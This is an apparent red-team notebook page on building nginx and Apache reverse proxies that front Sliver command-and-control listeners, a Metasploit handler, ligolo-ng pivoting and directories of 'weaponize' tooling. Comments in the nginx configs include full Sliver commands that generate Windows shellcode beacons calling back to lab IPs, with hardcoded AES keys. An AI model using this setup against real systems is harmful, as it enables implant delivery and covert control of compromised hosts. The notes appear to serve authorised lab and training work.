| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|

* [HTTP(S) reverse proxy](../../red_team/infra/http_reverse_proxy.md)
    * [Nginx reverse proxy](../../red_team/infra/http_reverse_proxy.md#nginx-reverse-proxy)
    * [Apache reverse proxy](../../red_team/infra/http_reverse_proxy.md#apache-reverse-proxy)
        * [URI redirection](../../red_team/infra/http_reverse_proxy.md#uri-redirection)
        * [User Agent Redirection](../../red_team/infra/http_reverse_proxy.md#user-agent-redirection)
    * [links](../../red_team/infra/http_reverse_proxy.md#links)

# HTTP(S) reverse proxy

* port 443 for `ligolo-ng`:
    * `sudo ligolo-ng-proxy -selfcert -laddr 0.0.0.0:4444`
    * `sudo socat -d -d TCP-LISTEN:443,fork TCP:localhost:4444` (443
        to 4444)
* port 80 for apache with redirectors :
* redirections:
    * http://\<ip\>/sliver/
        `http --lhost <ip|127.0.0.1> -lport <lport|8890>`
    * http://\<ip\>/sharp/
        `uploadserver -b 127.0.0.1 8881 --directory /opt/windows/SharpCollection/NetFramework_4.7_x64`
    * http://\<ip\>/win/
        `uploadserver -b 127.0.0.1 8882 --directory /opt/windows/windows_weaponize`
    * http://\<ip\>/lin/
        `uploadserver -b 127.0.0.1 8883 --directory /opt/linux/linux_weaponize`
    * http://\<ip\>/lab/
        `uploadserver -b 127.0.0.1 8884 --directory $(pwd)/utils`
## Nginx reverse proxy
better solution for box because allow multiple directory to be mapped on the same site (did not check how to do it on apache) 
```bash
$ cat /etc/nginx/nginx.conf
user http;
worker_processes  1;
#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;
#pid        logs/nginx.pid;
# Load all installed modules
include modules.d/*.conf;
events {
    worker_connections  1024;
}
http {
    include       mime.types;
    default_type  application/octet-stream;
    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
    #                  '$status $body_bytes_sent "$http_referer" '
    #                  '"$http_user_agent" "$http_x_forwarded_for"';
    #access_log  logs/access.log  main;
    sendfile        on;
    #tcp_nopush     on;
    #keepalive_timeout  0;
    keepalive_timeout  65;
    #gzip  on;
   #include /etc/nginx/conf.d/*.conf;
   include /etc/nginx/conf.d/http.conf;
}
```

```bash
$ cat /etc/nginx/conf.d/http.conf

server {
    listen       8880;
    server_name  localhost;

    #access_log  logs/host.access.log  main;
    #error_page  404              /404.html;
    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   html;
    }
    location / {
        root   html;
        index  index.html index.htm;
    }
    location /sharp/ {
        alias   /opt/windows/SharpCollection/NetFramework_4.7_x64/;
        autoindex on;
    }
    location /win/ {
        alias   /opt/windows/windows_weaponize/;
        autoindex on;
    }
    location /lin/ {
        alias   /opt/linux/linux_weaponize/;
        autoindex on;
    }
    location /obf/ {
        proxy_pass http://127.0.0.1:8881/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
    location /lab/ {
        proxy_pass  http://127.0.0.1:8884/;
    }
    # http -L 127.0.0.1 -l 8890 --persistent
    location /sliver/ {
        proxy_pass  http://127.0.0.1:8890/;
    }
#    # https --lhost 127.0.0.1 --lport 8891 --persistent --cert /home/jubeaz/sliver.crt --key /home/jubeaz/sliver.key
#    location /sliver_ssl/ {
#        proxy_pass  http://127.0.0.1:8891/;
#    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://192.168.10.21:80/sliver/pwn jubeaz
    # stage-listener --url http://127.0.0.1:8870 --profile jubeaz  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
    location /sl_debug/ {
        proxy_pass  http://127.0.0.1:8870/;
    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://192.168.10.21:443/sliver/pwn jubeaz_https
    # stage-listener --url http://127.0.0.1:8871 --profile jubeaz_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib    
    location /sl_debug_ssl/ {
        proxy_pass  http://127.0.0.1:8871/;
    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://10.10.14.17:80/sliver/pwn cybernetics
    # stage-listener --url http://127.0.0.1:8872 --profile cybernetics  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
    location /sl_prod/ {
        proxy_pass  http://127.0.0.1:8872/;
    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://10.10.14.17:443/sliver/pwn cybernetics_https
    # stage-listener --url http://127.0.0.1:8873 --profile cybernetics_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib 
    location /sl_prod_ssl/ {
        proxy_pass  http://127.0.0.1:8873/;
    }
    location ~ ^/msf(.*) {
 	proxy_pass http://127.0.0.1:4445;
    }
}
```

```bash
$ cat /etc/nginx/conf.d/https.conf

server {
    listen       443 ssl;
#        server_name  localhost;

    ssl_certificate      /etc/nginx/ssl/redteam.crt;
    ssl_certificate_key  /etc/nginx/ssl/redteam.key;

    ssl_session_cache    shared:SSL:1m;
    ssl_session_timeout  5m;

    ssl_ciphers  HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers  on;

    location / {
        root   html;
        index  index.html index.htm;
        autoindex on;
    }
    location /sharp/ {
        alias   /opt/windows/SharpCollection/NetFramework_4.7_x64/;
        autoindex on;
    }
    location /win/ {
        alias   /opt/windows/windows_weaponize/;
        autoindex on;
    }
    location /lin/ {
        alias   /opt/linux/linux_weaponize/;
        autoindex on;
    }
    location /obf/ {
        proxy_pass http://127.0.0.1:8881/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
    location /lab/ {
        proxy_pass  http://127.0.0.1:8884/;
    }
    # http --lhost 0.0.0.0 --lport 8890 --persistent
    location /sliver/ {
        proxy_pass  http://127.0.0.1:8890/;
#        proxy_pass  https://127.0.0.1:8891/;
#        # HTTP headers standards
#        proxy_set_header Host $host;
#        proxy_set_header X-Real-IP $remote_addr;
#        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
#        proxy_set_header X-Forwarded-Proto https;
#
#        # HTTPS backend options
#        proxy_ssl_server_name on;
#        proxy_ssl_verify off; 
#
#        proxy_http_version 1.1;
#        proxy_set_header Upgrade $http_upgrade;
#        proxy_set_header Connection "upgrade";
    }
#    # https --lhost 0.0.0.0 --lport 8891 --persistent --cert /home/jubeaz/sliver.crt --key /home/jubeaz/sliver.key
#    location /sliver_ssl/ {
#        # sliver does not like proxy ?
#        proxy_pass  http://127.0.0.1:8891/;
#    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://192.168.10.21:80/sliver/pwn jubeaz
    # stage-listener --url http://127.0.0.1:8870 --profile jubeaz  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
    location /sl_debug/ {
        proxy_pass  http://127.0.0.1:8870/;
    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://192.168.10.21:443/sliver/pwn jubeaz_https
    # stage-listener --url http://127.0.0.1:8871 --profile jubeaz_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib    
    location /sl_debug_ssl/ {
        proxy_pass  http://127.0.0.1:8871/;
    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://10.10.14.17:80/sliver/pwn cybernetics
    # stage-listener --url http://127.0.0.1:8872 --profile cybernetics  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
    location /sl_prod/ {
        proxy_pass  http://127.0.0.1:8872/;
    }
    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://10.10.14.17:443/sliver/pwn cybernetics_https
    # stage-listener --url http://127.0.0.1:8873 --profile cybernetics_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib 
    location /sl_prod_ssl/ {
        proxy_pass  http://127.0.0.1:8873/;
    }

#    location /ligolo {
#            proxy_set_header Host $host;
#            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
#            proxy_set_header Upgrade websocket;
#            proxy_set_header Connection Upgrade;
#            proxy_http_version 1.1;
#            proxy_pass https://127.0.0.1:11602;
#    }
}
```


## Apache reverse proxy

use `.htaccess` instead of config. In order to use `.htaccess` files, we
must tell apache to allow the files to override rules in the config. In
the apache config, change None to All in the following block

    <Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

enable the module

    sudo sed -i 's|#LoadModule rewrite_module |LoadModule rewrite_module |' /etc/httpd/conf/httpd.conf 
    sudo sed -i 's|#LoadModule proxy_http_module |LoadModule proxy_http_module |' /etc/httpd/conf/httpd.conf 
    sudo sed -i 's|#LoadModule proxy_module |LoadModule proxy_module |' /etc/httpd/conf/httpd.conf 

Apache recommends that the server config file be used for `mod_rewrite`,
but we aren't running a production server and the benefit of not having
to reload apache2 every time we make a change means we will use
.htaccess.

### URI redirection
```bash
    root$ cat /srv/http/.htaccess
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/sharp/(.*)$
    RewriteRule ^sharp/(.*)$ http://127.0.0.1:8881/$1 [P]
    RewriteCond %{REQUEST_URI} ^/win/(.*)$
    RewriteRule ^win/(.*)$ http://127.0.0.1:8882/$1 [P]
    RewriteCond %{REQUEST_URI} ^/lin/(.*)$
    RewriteRule ^lin/(.*)$ http://127.0.0.1:8883/$1 [P]
    RewriteCond %{REQUEST_URI} ^/lab/(.*)$
    RewriteRule ^lab/(.*)$ http://127.0.0.1:8884/$1 [P]
    ####
    # SLIVER C2
    ####
    RewriteCond %{REQUEST_URI} ^/sliver/(.*)$
    RewriteRule ^sliver/(.*)$ http://127.0.0.1:8890/$1 [P]
    ####
    # SLIVER STAGE LISTENER
    ####
    RewriteCond %{REQUEST_URI} ^/s_fh/(.*)$
    RewriteRule ^s_fh/(.*)$ http://127.0.0.1:8870/$1 [P]
    ####
    # SLIVER BEACON STAGE LISTENER
    ####
    RewriteCond %{REQUEST_URI} ^/s_b_fh/(.*)$
    RewriteRule ^s_b_fh/(.*)$ http://127.0.0.1:8871/$1 [P]
```
### User Agent Redirection

## links

* [Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection](https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/)

* [Test your htaccess rewrite rules](https://htaccess.madewithlove.com/)
